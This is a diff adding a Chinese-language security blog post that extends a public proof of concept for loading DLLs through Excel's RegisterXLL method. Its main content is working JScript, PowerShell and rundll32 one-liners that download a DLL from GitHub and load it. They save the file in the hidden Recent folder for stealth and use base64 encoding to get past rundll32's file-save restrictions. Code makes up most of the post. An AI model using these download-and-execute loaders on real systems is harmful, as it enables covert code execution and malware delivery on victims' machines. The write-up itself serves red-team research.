@@ -1,0 +1,329 @@
+I"�9<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>Ryan Hanson‏@ryHanson最近分享了一个技巧，利用<code class="language-plaintext highlighter-rouge">Excel.Application object's RegisterXLL()</code>能够加载dll。我对其分享的POC作了测试，接着做了扩展，添加功能实现远程下载执行，并且分析该方法相关的利用技巧，详细介绍脚本开发中的细节。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍如下内容：</p>
+
+<ul>
+  <li>POC测试</li>
+  <li>添加功能实现远程下载执行</li>
+  <li>扩展用法1：通过powershell实现</li>
+  <li>扩展用法2：结合rundll32使用</li>
+</ul>
+
+<h2 id="0x02-poc测试">0x02 POC测试</h2>
+<hr />
+
+<p><strong>POC地址如下：</strong></p>
+
+<p>https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52</p>
+
+<p>前提是系统已安装Microsoft Office软件，共提供三种利用方式</p>
+
+<h3 id="1rundll32">1.rundll32</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";x=new%20ActiveXObject('Excel.Application');x.RegisterXLL('C:\\test\\messagebox.dll');this.close();
+</code></pre></div></div>
+
+<h3 id="2js">2.js</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var excel = new ActiveXObject("Excel.Application");
+excel.RegisterXLL("C:\\test\\messagebox.dll");
+</code></pre></div></div>
+
+<h3 id="3powershell">3.powershell</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
+$excel.RegisterXLL("C:\test\messagebox.dll")
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>测试的messagebox.dll来自于：https://github.com/3gstudent/test/blob/master/msg.dll</p>
+
+<p>大小3kb，源代码及编译方法可参照文章<a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">《Use Office to maintain persistence》</a></p>
+
+<h2 id="0x03-添加功能">0x03 添加功能</h2>
+<hr />
+
+<h3 id="jscript基础知识">Jscript基础知识：</h3>
+
+<p><strong>1、输出内容</strong></p>
+
+<p>js代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo("1");
+</code></pre></div></div>
+
+<p>直接执行js脚本会弹框</p>
+
+<p>cmd执行：<code class="language-plaintext highlighter-rouge">cscript.exe msg.js</code>，控制台输出1</p>
+
+<p><strong>2、特殊目录</strong></p>
+
+<p>输出当前用户的临时目录：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").Environment("USER")("TEMP"));
+</code></pre></div></div>
+
+<p>输出Recent目录：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent");
+</code></pre></div></div>
+
+<p>即<code class="language-plaintext highlighter-rouge">%AppData%\Microsoft\Windows\Recent</code>（该目录后文会用到）</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-1.png" alt="Alt text" /></p>
+
+<p>添加文件名并输出：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\msg.dll");
+</code></pre></div></div>
+
+<h3 id="对原poc添加功能">对原POC添加功能：</h3>
+
+<p><strong>1、判断是否安装Microsoft Office</strong></p>
+
+<p>通过判断是否存在Microsoft Office默认安装文件夹实现</p>
+
+<p>查找文件夹：</p>
+
+<p><code class="language-plaintext highlighter-rouge">"c:\Program Files\Microsoft Office"</code></p>
+
+<p>对应js代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
+if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
+{   
+	WScript.Echo("[+] Find Microsoft Office.");   
+}
+else
+{
+	WScript.Echo("[!] I can't find Microsoft Office!");    
+}
+</code></pre></div></div>
+
+<p><strong>2、从Github下载dll文件并保存至Recent目录</strong></p>
+
+<p><strong>方式1:</strong> 使用Msxml2.XMLHTTP</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var sGet=new ActiveXObject("ADODB.Stream");
+var xGet=null;
+xGet=new ActiveXObject("Msxml2.XMLHTTP");
+xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
+xGet.Send();
+sGet.Type=1;
+sGet.Open();
+sGet.Write(xGet.ResponseBody);
+sGet.SaveToFile((WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll"),2);
+</code></pre></div></div>
+
+<p><strong>方式2:</strong> 使用WinHttp.WinHttpRequest.5.1</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
+h.Send();
+s=new ActiveXObject("ADODB.Stream");
+s.Type=1;
+s.Open();
+s.Write(h.ResponseBody);
+x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
+s.SaveToFile(x，2);
+</code></pre></div></div>
+
+<p>两种js方式均可以，但是在rundll32下使用的话，需要使用方式2，原因如下：</p>
+
+<p>不支持<code class="language-plaintext highlighter-rouge">WScript.CreateObject("WScript.Shell")</code>，需要换成<code class="language-plaintext highlighter-rouge">new%20ActiveXObject("WScript.Shell")</code></p>
+
+<p>cmd执行：</p>
+
+<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";xGet=new%20ActiveXObject("Msxml2.XMLHTTP");xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);xGet.Send();</code></p>
+
+<p>提示权限不够，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-2.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>选择保存在Recent目录是为了提高隐蔽性</p>
+
+<p>保存在Recent目录，通过explorer.exe无法查看下载的dll，详情如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/1.gif" alt="Alt text" /></p>
+
+<p>但在cmd下能够查看下载的dll，详情如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/3.png" alt="Alt text" /></p>
+
+<p>在其他目录不存在这个问题，详情如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/2.gif" alt="Alt text" /></p>
+
+<p>为保证js和rundll32利用代码格式对应，原js代码作相应优化，最终代码为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
+if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
+{   
+	WScript.Echo("[+] Find Microsoft Office."); 
+	WScript.Echo("[+] Download file...");
+	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+	h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
+	h.Send();
+	s=new ActiveXObject("ADODB.Stream");
+	s.Type=1;
+	s.Open();
+	s.Write(h.ResponseBody);
+	x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
+	s.SaveToFile(x,2);
+
+	WScript.Echo("[+] Download Success.");
+	WScript.Echo("[+] Load dll...");	 
+	e= new ActiveXObject("Excel.Application");
+	e.RegisterXLL(x);
+	WScript.Echo("[+] Load dll Success.");	  
+}
+else
+{
+	WScript.Echo("[!] I can't find Microsoft Office!");  	   
+}
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>相关代码已上传至Github，完整POC可参照：</p>
+
+<p>https://github.com/3gstudent/ExcelDllLoader</p>
+
+<h2 id="0x04-扩展用法">0x04 扩展用法</h2>
+<hr />
+
+<h3 id="1通过powershell实现">1、通过powershell实现</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$path=$env:APPDATA+"\Microsoft\Windows\Recent\calc.dll"
+$client = new-object System.Net.WebClient
+$client.DownloadFile('https://raw.githubusercontent.com/3gstudent/test/master/calc.dll', $path)
+$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
+$excel.RegisterXLL($path)
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>该代码缺少判断MicrosoftOffice是否安装的功能</p>
+
+<h3 id="2结合rundll32使用">2、结合rundll32使用</h3>
+
+<p>需要注意如下细节：</p>
+
+<ul>
+  <li>空格用%20表示</li>
+  <li>为避免执行后弹框，需要加入语句document.write();</li>
+</ul>
+
+<p>否则，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-22.png" alt="Alt text" /></p>
+
+<p>使用ADODB.Stream保存文件，会报错,测试代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(h.ResponseBody);x=new%20ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";s.SaveToFile(x,2);</code></p>
+
+<p>提示因为安全设置导致无法保存文件，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-3.png" alt="Alt text" /></p>
+
+<p>换用Scripting.FileSystemObject，能够保存文本文件，但是不支持二进制文件</p>
+
+<p>保存文本文件,测试代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/version.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>
+
+<p>保存二进制文件，测试代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>
+
+<p>报错，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-4.png" alt="Alt text" /></p>
+
+<p><strong>解决方法：</strong></p>
+
+<p>将二进制文件作base64编码并保存成文本文件，再通过Scripting.FileSystemObject保存</p>
+
+<p>对calc.dll作base64编码并保存至文件buffer.txt,对应powershell代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('calc.dll')
+$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("buffer.txt") 
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>读取二进制文件，不能使用命令Get-content</p>
+
+<p>将buffer.txt上传至github</p>
+
+<p>下载base64并保存文件对应的js代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
+h.Send();
+fso1=new ActiveXObject("Scripting.FileSystemObject");
+f=fso1.CreateTextFile("c:\\test\\1.txt",true);
+f.WriteLine(h.ResponseText);
+f.Close();
+</code></pre></div></div>
+
+<p>下载base64并保存文件对应rundll32的代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>
+
+<p>文件保存成功，该文件存储base64加密后的calc.dll</p>
+
+<p>base64解密该文件并加载dll对应的js代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x="c:\\test\\calc.dll";
+h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
+h.Send();
+var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+var length = enc.GetByteCount_2(h.ResponseText);
+var ba = enc.GetBytes_4(h.ResponseText);
+var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+ba = transform.TransformFinalBlock(ba, 0, length);
+s=new ActiveXObject("ADODB.Stream");
+s.Type=1;
+s.Open();
+s.Write(ba);	
+s.SaveToFile(x,2);
+new ActiveXObject("Excel.Application").RegisterXLL(x);
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>以上两段代码结合，可应用在通过rundll32进行文件下载（先通过rundll32下载base64加密的文件，然后使用js脚本解密），可解决在之前的文章《JavaScript backdoor》给读者留下的小bug</p>
+
+<p>base64解密该文件并加载dll对应的powershell代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$FilePath="C:\test\test1.dll"
+$base64Buf = Get-content c:\test\1.txt
+$fileContentBytes = [System.Convert]::FromBase64String($base64Buf) 
+[System.IO.File]::WriteAllBytes($FilePath,$fileContentBytes)
+$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
+$excel.RegisterXLL($FilePath)
+</code></pre></div></div>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了利用Excel.Application object’s RegisterXLL() method加载dll的相关方法，着重分析如何编写js和powershell脚本对其扩展，并解决了在之前的文章《JavaScript backdoor》给读者留下的小bug。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
